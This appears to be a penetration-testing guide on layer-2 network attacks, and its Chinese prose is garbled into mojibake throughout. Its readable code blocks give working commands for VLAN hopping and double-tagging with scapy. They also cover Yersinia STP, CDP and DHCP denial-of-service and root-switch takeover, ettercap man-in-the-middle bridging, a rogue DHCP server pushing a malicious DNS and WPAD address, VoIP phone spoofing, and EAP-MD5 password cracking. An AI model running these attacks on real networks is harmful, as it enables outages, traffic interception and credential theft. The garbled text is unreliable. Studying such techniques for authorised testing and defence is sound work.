ä¸€æ—¦æ‚¨çŸ¥é“VLAN IDå’ŒIPå€¼ï¼Œæ‚¨å¯ä»¥**é…ç½®è™šæ‹Ÿæ¥å£ä»¥æ”»å‡»ç‰¹å®šVLAN**ã€‚\
å¦‚æœDHCPä¸å¯ç”¨ï¼Œåˆ™ä½¿ç”¨_ifconfig_è®¾ç½®é™æ€IPåœ°å€ã€‚
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### è‡ªåŠ¨ VLAN è·³è·ƒå™¨

è®¨è®ºçš„æ”»å‡»**åŠ¨æ€å¹²çº¿å’Œåˆ›å»ºè™šæ‹Ÿæ¥å£ä»¥åŠå‘ç°å…¶ä»– VLAN ä¸­çš„ä¸»æœº**æ˜¯ç”±å·¥å…·è‡ªåŠ¨æ‰§è¡Œçš„ï¼š[**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### åŒé‡æ ‡è®°

å¦‚æœæ”»å‡»è€…çŸ¥é“å—å®³ä¸»æœºçš„**MACã€IP å’Œ VLAN ID çš„å€¼**ï¼Œä»–å¯ä»¥å°è¯•ä½¿ç”¨å…¶æŒ‡å®šçš„ VLAN å’Œå—å®³è€…çš„ VLAN **åŒé‡æ ‡è®°ä¸€ä¸ªå¸§** å¹¶å‘é€ä¸€ä¸ªæ•°æ®åŒ…ã€‚ç”±äº**å—å®³è€…æ— æ³•ä¸æ”»å‡»è€…è¿æ¥å›æ¥**ï¼Œæ‰€ä»¥**æ”»å‡»è€…çš„æœ€ä½³é€‰æ‹©æ˜¯é€šè¿‡ UDP é€šä¿¡**åˆ°å¯ä»¥æ‰§è¡Œä¸€äº›æœ‰è¶£æ“ä½œçš„åè®®ï¼ˆå¦‚ SNMPï¼‰ã€‚

æ”»å‡»è€…çš„å¦ä¸€ä¸ªé€‰æ‹©æ˜¯å‘èµ·**TCP ç«¯å£æ‰«æï¼Œæ¬ºéª—æ”»å‡»è€…æ§åˆ¶çš„ IP å¹¶å¯è¢«å—å®³è€…è®¿é—®**ï¼ˆå¯èƒ½é€šè¿‡äº’è”ç½‘ï¼‰ã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥å—…æ¢ä»–æ‹¥æœ‰çš„ç¬¬äºŒä¸ªä¸»æœºæ˜¯å¦æ¥æ”¶åˆ°æ¥è‡ªå—å®³è€…çš„ä¸€äº›æ•°æ®åŒ…ã€‚

![](<../../.gitbook/assets/image (635) (1).png>)

è¦æ‰§è¡Œæ­¤æ”»å‡»ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ scapyï¼š`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### ä¾§å‘ VLAN åˆ†å‰²ç»•è¿‡ <a href="#d679" id="d679"></a>

å¦‚æœæ‚¨**å¯ä»¥è®¿é—®ç›´æ¥è¿æ¥çš„äº¤æ¢æœº**ï¼Œåˆ™å¯ä»¥åœ¨ç½‘ç»œä¸­**ç»•è¿‡ VLAN åˆ†å‰²**ã€‚åªéœ€å°†ç«¯å£åˆ‡æ¢åˆ°å¹²çº¿æ¨¡å¼ï¼ˆä¹Ÿç§°ä¸ºå¹²çº¿ï¼‰ï¼Œä½¿ç”¨ç›®æ ‡ VLAN çš„ ID åˆ›å»ºè™šæ‹Ÿæ¥å£ï¼Œå¹¶é…ç½® IP åœ°å€ã€‚æ‚¨å¯ä»¥å°è¯•åŠ¨æ€è¯·æ±‚åœ°å€ï¼ˆDHCPï¼‰ï¼Œä¹Ÿå¯ä»¥é™æ€é…ç½®ã€‚è¿™å–å†³äºå…·ä½“æƒ…å†µã€‚

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### ç¬¬ 3 å±‚ç§æœ‰ VLAN ç»•è¿‡

åœ¨æŸäº›ç¯å¢ƒä¸­ï¼Œä¾‹å¦‚è®¿å®¢æ— çº¿ç½‘ç»œï¼Œå®æ–½äº†**ç«¯å£éš”ç¦»ï¼ˆä¹Ÿç§°ä¸ºç§æœ‰ VLANï¼‰**è®¾ç½®ï¼Œä»¥é˜²æ­¢è¿æ¥åˆ°æ— çº¿æ¥å…¥ç‚¹çš„å®¢æˆ·ç«¯ç›´æ¥ç›¸äº’é€šä¿¡ã€‚ç„¶è€Œï¼Œå·²ç»å‘ç°äº†ä¸€ç§å¯ä»¥è§„é¿è¿™äº›éš”ç¦»æªæ–½çš„æŠ€æœ¯ã€‚è¯¥æŠ€æœ¯åˆ©ç”¨ç½‘ç»œ ACL çš„ç¼ºå¤±æˆ–å…¶ä¸æ­£ç¡®é…ç½®ï¼Œä½¿ IP æ•°æ®åŒ…èƒ½å¤Ÿé€šè¿‡è·¯ç”±å™¨è·¯ç”±åˆ°åŒä¸€ç½‘ç»œä¸Šçš„å¦ä¸€ä¸ªå®¢æˆ·ç«¯ã€‚

æ”»å‡»æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ª**æºå¸¦ç›®æ ‡å®¢æˆ·ç«¯ IP åœ°å€ä½†å¸¦æœ‰è·¯ç”±å™¨ MAC åœ°å€çš„æ•°æ®åŒ…**æ¥æ‰§è¡Œçš„ã€‚è¿™ä¼šå¯¼è‡´è·¯ç”±å™¨é”™è¯¯åœ°å°†æ•°æ®åŒ…è½¬å‘åˆ°ç›®æ ‡å®¢æˆ·ç«¯ã€‚è¿™ç§æ–¹æ³•ç±»ä¼¼äºåŒæ ‡è®°æ”»å‡»ä¸­ä½¿ç”¨çš„æ–¹æ³•ï¼Œå…¶ä¸­åˆ©ç”¨å¯è®¿é—®å—å®³è€…çš„ä¸»æœºçš„èƒ½åŠ›æ¥åˆ©ç”¨å®‰å…¨æ¼æ´ã€‚

**æ”»å‡»çš„å…³é”®æ­¥éª¤ï¼š**
1. **æ„é€ æ•°æ®åŒ…ï¼š** ç‰¹åˆ«æ„é€ ä¸€ä¸ªæ•°æ®åŒ…ï¼Œå…¶ä¸­åŒ…å«ç›®æ ‡å®¢æˆ·ç«¯çš„ IP åœ°å€ï¼Œä½†å¸¦æœ‰è·¯ç”±å™¨çš„ MAC åœ°å€ã€‚
2. **åˆ©ç”¨è·¯ç”±å™¨è¡Œä¸ºï¼š** å‘é€æ„é€ çš„æ•°æ®åŒ…åˆ°è·¯ç”±å™¨ï¼Œç”±äºé…ç½®ï¼Œè·¯ç”±å™¨å°†æ•°æ®åŒ…é‡å®šå‘åˆ°ç›®æ ‡å®¢æˆ·ç«¯ï¼Œç»•è¿‡ç§æœ‰ VLAN è®¾ç½®æä¾›çš„éš”ç¦»ã€‚

### VTP æ”»å‡»

VTPï¼ˆVLAN å¹²çº¿åè®®ï¼‰é›†ä¸­ç®¡ç† VLANã€‚å®ƒåˆ©ç”¨ä¿®è®¢å·æ¥ç»´æŠ¤ VLAN æ•°æ®åº“çš„å®Œæ•´æ€§ï¼›ä»»ä½•ä¿®æ”¹éƒ½ä¼šå¢åŠ æ­¤æ•°å­—ã€‚äº¤æ¢æœºé‡‡ç”¨å…·æœ‰è¾ƒé«˜ä¿®è®¢å·çš„é…ç½®ï¼Œæ›´æ–°å…¶è‡ªå·±çš„ VLAN æ•°æ®åº“ã€‚

#### VTP åŸŸè§’è‰²

- **VTP æœåŠ¡å™¨ï¼š** ç®¡ç† VLANâ€”åˆ›å»ºã€åˆ é™¤ã€ä¿®æ”¹ã€‚å‘åŸŸæˆå‘˜å¹¿æ’­ VTP å…¬å‘Šã€‚
- **VTP å®¢æˆ·ç«¯ï¼š** æ¥æ”¶ VTP å…¬å‘Šä»¥åŒæ­¥å…¶ VLAN æ•°æ®åº“ã€‚æ­¤è§’è‰²å—é™äºæœ¬åœ° VLAN é…ç½®ä¿®æ”¹ã€‚
- **VTP é€æ˜ï¼š** ä¸å‚ä¸ VTP æ›´æ–°ï¼Œä½†è½¬å‘ VTP å…¬å‘Šã€‚ä¸å— VTP æ”»å‡»å½±å“ï¼Œä¿æŒä¿®è®¢å·æ’å®šä¸ºé›¶ã€‚

#### VTP å¹¿å‘Šç±»å‹

- **æ‘˜è¦å¹¿å‘Šï¼š** æ¯ 300 ç§’ç”± VTP æœåŠ¡å™¨å¹¿æ’­ï¼Œæºå¸¦åŸºæœ¬åŸŸä¿¡æ¯ã€‚
- **å­é›†å¹¿å‘Šï¼š** åœ¨ VLAN é…ç½®æ›´æ”¹åå‘é€ã€‚
- **å¹¿å‘Šè¯·æ±‚ï¼š** ç”± VTP å®¢æˆ·ç«¯å‘å‡ºä»¥è¯·æ±‚æ‘˜è¦å¹¿å‘Šï¼Œé€šå¸¸æ˜¯å“åº”äºæ£€æµ‹åˆ°æ›´é«˜é…ç½®ä¿®è®¢å·ã€‚

VTP æ¼æ´ä»…é€šè¿‡å¹²çº¿ç«¯å£å¯åˆ©ç”¨ï¼Œå› ä¸º VTP å…¬å‘Šä»…é€šè¿‡å®ƒä»¬ä¼ æ’­ã€‚DTP æ”»å‡»åçš„æƒ…æ™¯å¯èƒ½è½¬å‘ VTPã€‚å·¥å…·å¦‚ Yersinia å¯ä»¥ä¿ƒè¿› VTP æ”»å‡»ï¼Œæ—¨åœ¨æ¸…é™¤ VLAN æ•°æ®åº“ï¼Œæœ‰æ•ˆåœ°å¹²æ‰°ç½‘ç»œã€‚

æ³¨æ„ï¼šæ­¤è®¨è®ºæ¶‰åŠ VTP ç‰ˆæœ¬ 1ï¼ˆVTPv1ï¼‰ã€‚
```bash
%% yersinia -G # Launch Yersinia in graphical mode ```
```
### STP æ”»å‡»

**å¦‚æœæ‚¨æ— æ³•åœ¨æ¥å£ä¸Šæ•è· BPDU å¸§ï¼Œåˆ™å¾ˆå¯èƒ½æ— æ³•æˆåŠŸè¿›è¡Œ STP æ”»å‡»ã€‚**

#### **STP BPDU DoS**

é€šè¿‡å‘é€å¤§é‡çš„ BPDUs TCPï¼ˆæ‹“æ‰‘æ›´æ”¹é€šçŸ¥ï¼‰æˆ– Confï¼ˆåœ¨åˆ›å»ºæ‹“æ‰‘æ—¶å‘é€çš„ BPDUï¼‰æ¥ä½¿äº¤æ¢æœºè¶…è½½å¹¶åœæ­¢æ­£å¸¸å·¥ä½œã€‚
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP æ”»å‡»**

å½“å‘é€ TCP æ—¶ï¼Œäº¤æ¢æœºçš„ CAM è¡¨å°†åœ¨ 15 ç§’å†…è¢«åˆ é™¤ã€‚ç„¶åï¼Œå¦‚æœæŒç»­å‘é€è¿™ç§ç±»å‹çš„æ•°æ®åŒ…ï¼ŒCAM è¡¨å°†ä¸æ–­é‡æ–°å¯åŠ¨ï¼ˆæˆ–æ¯ 15 ç§’ä¸€æ¬¡ï¼‰ï¼Œå½“é‡æ–°å¯åŠ¨æ—¶ï¼Œäº¤æ¢æœºçš„è¡Œä¸ºç±»ä¼¼äºé›†çº¿å™¨ã€‚
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

æ”»å‡»è€…æ¨¡æ‹Ÿäº¤æ¢æœºçš„è¡Œä¸ºï¼Œæˆä¸ºç½‘ç»œçš„STPæ ¹ã€‚ç„¶åï¼Œæ›´å¤šæ•°æ®å°†é€šè¿‡ä»–ä¼ é€’ã€‚å½“æ‚¨è¿æ¥åˆ°ä¸¤ä¸ªä¸åŒçš„äº¤æ¢æœºæ—¶ï¼Œè¿™æ˜¯å¾ˆæœ‰è¶£çš„ã€‚\
è¿™æ˜¯é€šè¿‡å‘é€BPDUs CONFæ•°æ®åŒ…æ¥å®ç°çš„ï¼Œå…¶ä¸­æŒ‡å®š**ä¼˜å…ˆçº§**å€¼å°äºå®é™…æ ¹äº¤æ¢æœºçš„ä¼˜å…ˆçº§ã€‚
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**å¦‚æœæ”»å‡»è€…è¿æ¥åˆ°2ä¸ªäº¤æ¢æœºï¼Œä»–å¯ä»¥æˆä¸ºæ–°æ ‘çš„æ ¹ï¼Œè¿™ä¸¤ä¸ªäº¤æ¢æœºä¹‹é—´çš„æ‰€æœ‰æµé‡éƒ½å°†é€šè¿‡ä»–ä¼ é€’**ï¼ˆå°†æ‰§è¡Œä¸­é—´äººæ”»å‡»ï¼‰ã€‚
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP æ”»å‡»

æ€ç§‘å‘ç°åè®®ï¼ˆCDPï¼‰å¯¹äºæ€ç§‘è®¾å¤‡ä¹‹é—´çš„é€šä¿¡è‡³å…³é‡è¦ï¼Œä½¿å®ƒä»¬èƒ½å¤Ÿ**è¯†åˆ«å½¼æ­¤å¹¶å…±äº«é…ç½®è¯¦ç»†ä¿¡æ¯**ã€‚

#### è¢«åŠ¨æ•°æ®æ”¶é›† <a href="#0e0f" id="0e0f"></a>

CDP è¢«é…ç½®ä¸ºé€šè¿‡æ‰€æœ‰ç«¯å£å¹¿æ’­ä¿¡æ¯ï¼Œè¿™å¯èƒ½å¯¼è‡´å®‰å…¨é£é™©ã€‚æ”»å‡»è€…è¿æ¥åˆ°äº¤æ¢æœºç«¯å£åï¼Œå¯ä»¥éƒ¨ç½²ç½‘ç»œå—…æ¢å™¨ï¼Œå¦‚**Wireshark**ã€**tcpdump** æˆ– **Yersinia**ã€‚è¿™ç§è¡Œä¸ºå¯èƒ½ä¼šæ³„éœ²æœ‰å…³ç½‘ç»œè®¾å¤‡çš„æ•æ„Ÿæ•°æ®ï¼ŒåŒ…æ‹¬å…¶å‹å·å’Œè¿è¡Œçš„ Cisco IOS ç‰ˆæœ¬ã€‚æ”»å‡»è€…éšåå¯èƒ½é’ˆå¯¹å·²è¯†åˆ«çš„ Cisco IOS ç‰ˆæœ¬ä¸­çš„ç‰¹å®šæ¼æ´è¿›è¡Œæ”»å‡»ã€‚

#### å¼•å‘ CDP è¡¨æ´ªæ³› <a href="#0d6a" id="0d6a"></a>

ä¸€ç§æ›´å…·ä¾µç•¥æ€§çš„æ–¹æ³•æ˜¯é€šè¿‡è¶…è½½äº¤æ¢æœºçš„å†…å­˜ï¼Œä¼ªè£…æˆåˆæ³•çš„æ€ç§‘è®¾å¤‡ï¼Œå‘åŠ¨æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨ Yersinia å‘èµ·æ­¤ç±»æ”»å‡»çš„å‘½ä»¤åºåˆ—ï¼ŒYersinia æ˜¯ä¸€æ¬¾ä¸“ä¸ºæµ‹è¯•è®¾è®¡çš„ç½‘ç»œå·¥å…·ï¼š
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
åœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œäº¤æ¢æœºçš„ CPU å’Œ CDP é‚»å±…è¡¨è´Ÿæ‹…è¿‡é‡ï¼Œé€šå¸¸ä¼šå¯¼è‡´æ‰€è°“çš„**â€œç½‘ç»œç˜«ç—ªâ€**ï¼Œå› ä¸ºèµ„æºæ¶ˆè€—è¿‡å¤šã€‚

#### CDP å†’å……æ”»å‡»
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨[**scapy**](https://github.com/secdev/scapy/)ã€‚è¯·ç¡®ä¿ä½¿ç”¨`scapy/contrib`è½¯ä»¶åŒ…è¿›è¡Œå®‰è£…ã€‚

### VoIP æ”»å‡»å’Œ VoIP Hopper å·¥å…·

VoIP ç”µè¯è¶Šæ¥è¶Šå¤šåœ°ä¸ç‰©è”ç½‘è®¾å¤‡é›†æˆï¼Œæä¾›è¯¸å¦‚é€šè¿‡ç‰¹æ®Šç”µè¯å·ç è§£é”é—¨æˆ–æ§åˆ¶æ’æ¸©å™¨ç­‰åŠŸèƒ½ã€‚ç„¶è€Œï¼Œè¿™ç§é›†æˆå¯èƒ½å¸¦æ¥å®‰å…¨é£é™©ã€‚

è¯¥å·¥å…· [**voiphopper**](http://voiphopper.sourceforge.net) æ—¨åœ¨åœ¨å„ç§ç¯å¢ƒä¸­æ¨¡æ‹Ÿ VoIP ç”µè¯ï¼ˆCiscoã€Avayaã€Nortelã€Alcatel-Lucentï¼‰ã€‚å®ƒä½¿ç”¨è¯¸å¦‚ CDPã€DHCPã€LLDP-MED å’Œ 802.1Q ARP ç­‰åè®®æ¥å‘ç°è¯­éŸ³ç½‘ç»œçš„ VLAN IDã€‚

**VoIP Hopper** æä¾›äº†ä¸‰ç§ Cisco Discovery Protocol (CDP) çš„æ¨¡å¼ï¼š

1. **Sniff Mode** (`-c 0`)ï¼šåˆ†æç½‘ç»œæ•°æ®åŒ…ä»¥è¯†åˆ« VLAN IDã€‚
2. **Spoof Mode** (`-c 1`)ï¼šç”Ÿæˆæ¨¡ä»¿å®é™… VoIP è®¾å¤‡æ•°æ®åŒ…çš„è‡ªå®šä¹‰æ•°æ®åŒ…ã€‚
3. **Spoof with Pre-made Packet Mode** (`-c 2`)ï¼šå‘é€ä¸ç‰¹å®š Cisco IP ç”µè¯å‹å·ç›¸åŒçš„æ•°æ®åŒ…ã€‚

é€Ÿåº¦æœ€å¿«çš„é¦–é€‰æ¨¡å¼æ˜¯ç¬¬ä¸‰ç§ã€‚å®ƒéœ€è¦æŒ‡å®šï¼š

- æ”»å‡»è€…çš„ç½‘ç»œæ¥å£ï¼ˆ`-i` å‚æ•°ï¼‰ã€‚
- è¢«æ¨¡æ‹Ÿçš„ VoIP è®¾å¤‡çš„åç§°ï¼ˆ`-E` å‚æ•°ï¼‰ï¼Œéµå¾ª Cisco å‘½åæ ¼å¼ï¼ˆä¾‹å¦‚ï¼ŒSEP åè·Ÿ MAC åœ°å€ï¼‰ã€‚

åœ¨ä¼ä¸šè®¾ç½®ä¸­ï¼Œè¦æ¨¡ä»¿ç°æœ‰çš„ VoIP è®¾å¤‡ï¼Œå¯ä»¥ï¼š

- æ£€æŸ¥ç”µè¯ä¸Šçš„ MAC æ ‡ç­¾ã€‚
- æµè§ˆç”µè¯çš„æ˜¾ç¤ºè®¾ç½®ä»¥æŸ¥çœ‹å‹å·ä¿¡æ¯ã€‚
- å°† VoIP è®¾å¤‡è¿æ¥åˆ°ç¬”è®°æœ¬ç”µè„‘ï¼Œå¹¶ä½¿ç”¨ Wireshark è§‚å¯Ÿ CDP è¯·æ±‚ã€‚

æ‰§è¡Œè¯¥å·¥å…·çš„ç¬¬ä¸‰ç§æ¨¡å¼çš„ç¤ºä¾‹å‘½ä»¤å¯èƒ½æ˜¯ï¼š
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP æ”»å‡»

#### æšä¸¾
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

é’ˆå¯¹ DHCP æœåŠ¡å™¨å¯ä»¥æ‰§è¡Œä¸¤ç§ç±»å‹çš„ DoS æ”»å‡»ã€‚ç¬¬ä¸€ç§æ˜¯**æ¨¡æ‹Ÿè¶³å¤Ÿå¤šçš„è™šå‡ä¸»æœºä»¥ä½¿ç”¨æ‰€æœ‰å¯èƒ½çš„ IP åœ°å€**ã€‚\
åªæœ‰åœ¨æ‚¨èƒ½å¤Ÿçœ‹åˆ° DHCP æœåŠ¡å™¨çš„å“åº”å¹¶å®Œæˆåè®®ï¼ˆ**Discover**ï¼ˆè®¡ç®—æœºï¼‰--> **Offer**ï¼ˆæœåŠ¡å™¨ï¼‰--> **Request**ï¼ˆè®¡ç®—æœºï¼‰--> **ACK**ï¼ˆæœåŠ¡å™¨ï¼‰ï¼‰æ—¶ï¼Œæ­¤æ”»å‡»æ‰ä¼šç”Ÿæ•ˆã€‚ä¾‹å¦‚ï¼Œè¿™åœ¨**Wifi ç½‘ç»œä¸­æ˜¯ä¸å¯èƒ½çš„**ã€‚

æ‰§è¡Œ DHCP DoS çš„å¦ä¸€ç§æ–¹æ³•æ˜¯å‘é€ä¸€ä¸ª**ä½¿ç”¨æ¯ä¸ªå¯èƒ½çš„ IP ä½œä¸ºæºä»£ç çš„ DHCP-RELEASE æ•°æ®åŒ…**ã€‚ç„¶åï¼ŒæœåŠ¡å™¨ä¼šè®¤ä¸ºæ¯ä¸ªäººéƒ½å·²ç»å®Œæˆäº†å¯¹è¯¥ IP çš„ä½¿ç”¨ã€‚
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
æ›´è‡ªåŠ¨åŒ–çš„æ–¹æ³•æ˜¯ä½¿ç”¨å·¥å…·[DHCPing](https://github.com/kamorin/DHCPig)

æ‚¨å¯ä»¥ä½¿ç”¨ä¸Šè¿°çš„DoSæ”»å‡»æ¥å¼ºåˆ¶å®¢æˆ·ç«¯åœ¨ç¯å¢ƒä¸­è·å–æ–°çš„ç§Ÿçº¦ï¼Œå¹¶è€—å°½åˆæ³•æœåŠ¡å™¨ä½¿å…¶æ— æ³•å“åº”ã€‚å› æ­¤ï¼Œå½“åˆæ³•æœåŠ¡å™¨å°è¯•é‡æ–°è¿æ¥æ—¶ï¼Œ**æ‚¨å¯ä»¥æä¾›ä¸‹ä¸€ä¸ªæ”»å‡»ä¸­æåˆ°çš„æ¶æ„æ•°å€¼**ã€‚

#### è®¾ç½®æ¶æ„æ•°å€¼

å¯ä»¥ä½¿ç”¨ä½äº`/usr/share/responder/DHCP.py`çš„DHCPè„šæœ¬è®¾ç½®ä¸€ä¸ªæ¶æ„çš„DHCPæœåŠ¡å™¨ã€‚è¿™å¯¹äºç½‘ç»œæ”»å‡»å¾ˆæœ‰ç”¨ï¼Œæ¯”å¦‚é€šè¿‡å°†æµé‡é‡å®šå‘åˆ°æ¶æ„æœåŠ¡å™¨æ¥æ•è·HTTPæµé‡å’Œå‡­æ®ã€‚ç„¶è€Œï¼Œè®¾ç½®ä¸€ä¸ªæ¶æ„çš„ç½‘å…³æ•ˆæœè¾ƒå·®ï¼Œå› ä¸ºå®ƒåªå…è®¸æ•è·å®¢æˆ·ç«¯çš„å‡ºç«™æµé‡ï¼Œæ— æ³•è·å–çœŸå®ç½‘å…³çš„å“åº”ã€‚ç›¸åï¼Œå»ºè®®è®¾ç½®ä¸€ä¸ªæ¶æ„çš„DNSæˆ–WPADæœåŠ¡å™¨ä»¥è¿›è¡Œæ›´æœ‰æ•ˆçš„æ”»å‡»ã€‚

ä»¥ä¸‹æ˜¯é…ç½®æ¶æ„DHCPæœåŠ¡å™¨çš„å‘½ä»¤é€‰é¡¹ï¼š

- **æˆ‘ä»¬çš„IPåœ°å€ï¼ˆç½‘å…³å¹¿å‘Šï¼‰**ï¼šä½¿ç”¨`-i 10.0.0.100`å°†æ‚¨çš„æœºå™¨IPä½œä¸ºç½‘å…³è¿›è¡Œå¹¿å‘Šã€‚
- **æœ¬åœ°DNSåŸŸå**ï¼šå¯é€‰åœ°ï¼Œä½¿ç”¨`-d example.org`è®¾ç½®æœ¬åœ°DNSåŸŸåã€‚
- **åŸå§‹è·¯ç”±å™¨/ç½‘å…³IP**ï¼šä½¿ç”¨`-r 10.0.0.1`æŒ‡å®šåˆæ³•è·¯ç”±å™¨æˆ–ç½‘å…³çš„IPåœ°å€ã€‚
- **ä¸»DNSæœåŠ¡å™¨IP**ï¼šä½¿ç”¨`-p 10.0.0.100`è®¾ç½®æ‚¨æ§åˆ¶çš„æ¶æ„DNSæœåŠ¡å™¨çš„IPåœ°å€ã€‚
- **æ¬¡è¦DNSæœåŠ¡å™¨IP**ï¼šå¯é€‰åœ°ï¼Œä½¿ç”¨`-s 10.0.0.1`è®¾ç½®æ¬¡è¦DNSæœåŠ¡å™¨IPã€‚
- **æœ¬åœ°ç½‘ç»œçš„å­ç½‘æ©ç **ï¼šä½¿ç”¨`-n 255.255.255.0`å®šä¹‰æœ¬åœ°ç½‘ç»œçš„å­ç½‘æ©ç ã€‚
- **ç”¨äºDHCPæµé‡çš„æ¥å£**ï¼šä½¿ç”¨`-I eth1`åœ¨ç‰¹å®šç½‘ç»œæ¥å£ä¸Šç›‘å¬DHCPæµé‡ã€‚
- **WPADé…ç½®åœ°å€**ï¼šä½¿ç”¨`-w â€œhttp://10.0.0.100/wpad.datâ€`è®¾ç½®WPADé…ç½®çš„åœ°å€ï¼Œæœ‰åŠ©äºæ‹¦æˆªWebæµé‡ã€‚
- **æ¬ºéª—é»˜è®¤ç½‘å…³IP**ï¼šåŒ…æ‹¬`-S`æ¥æ¬ºéª—é»˜è®¤ç½‘å…³IPåœ°å€ã€‚
- **å“åº”æ‰€æœ‰DHCPè¯·æ±‚**ï¼šåŒ…æ‹¬`-R`ä½¿æœåŠ¡å™¨å“åº”æ‰€æœ‰DHCPè¯·æ±‚ï¼Œä½†è¯·æ³¨æ„è¿™ä¼šäº§ç”Ÿå™ªéŸ³å¹¶å¯èƒ½è¢«æ£€æµ‹åˆ°ã€‚

é€šè¿‡æ­£ç¡®ä½¿ç”¨è¿™äº›é€‰é¡¹ï¼Œå¯ä»¥å»ºç«‹ä¸€ä¸ªæ¶æ„çš„DHCPæœåŠ¡å™¨æœ‰æ•ˆåœ°æ‹¦æˆªç½‘ç»œæµé‡ã€‚
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAPæ”»å‡»**

ä»¥ä¸‹æ˜¯é’ˆå¯¹802.1Xå®æ–½å¯ä»¥ä½¿ç”¨çš„æ”»å‡»ç­–ç•¥ï¼š

- é€šè¿‡EAPè¿›è¡Œä¸»åŠ¨æš´åŠ›ç ´è§£å¯†ç 
- åˆ©ç”¨æ¶æ„EAPå†…å®¹æ”»å‡»RADIUSæœåŠ¡å™¨ _\*\*_(åˆ©ç”¨æ¼æ´)
- æ•è·EAPæ¶ˆæ¯å¹¶ç¦»çº¿ç ´è§£å¯†ç ï¼ˆEAP-MD5å’ŒPEAPï¼‰
- å¼ºåˆ¶ä½¿ç”¨EAP-MD5èº«ä»½éªŒè¯ç»•è¿‡TLSè¯ä¹¦éªŒè¯
- åœ¨ä½¿ç”¨é›†çº¿å™¨æˆ–ç±»ä¼¼è®¾å¤‡è¿›è¡Œèº«ä»½éªŒè¯æ—¶æ³¨å…¥æ¶æ„ç½‘ç»œæµé‡

å¦‚æœæ”»å‡»è€…ä½äºå—å®³è€…å’Œè®¤è¯æœåŠ¡å™¨ä¹‹é—´ï¼Œä»–å¯ä»¥å°è¯•é™çº§ï¼ˆå¦‚æœå¿…è¦ï¼‰è®¤è¯åè®®è‡³EAP-MD5ï¼Œå¹¶æ•è·è®¤è¯å°è¯•ã€‚ç„¶åï¼Œä»–å¯ä»¥ä½¿ç”¨æš´åŠ›ç ´è§£ï¼š
```
eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) æ”»å‡» <a href="#6196" id="6196"></a>

**FHRP**ï¼ˆFirst Hop Redundancy Protocolï¼‰æ˜¯ä¸€ç±»æ—¨åœ¨**åˆ›å»ºçƒ­å¤‡ä»½è·¯ç”±ç³»ç»Ÿ**çš„ç½‘ç»œåè®®ã€‚é€šè¿‡FHRPï¼Œç‰©ç†è·¯ç”±å™¨å¯ä»¥ç»„åˆæˆå•ä¸ªé€»è¾‘è®¾å¤‡ï¼Œæé«˜å®¹é”™èƒ½åŠ›å¹¶å¸®åŠ©åˆ†æ‹…è´Ÿè½½ã€‚

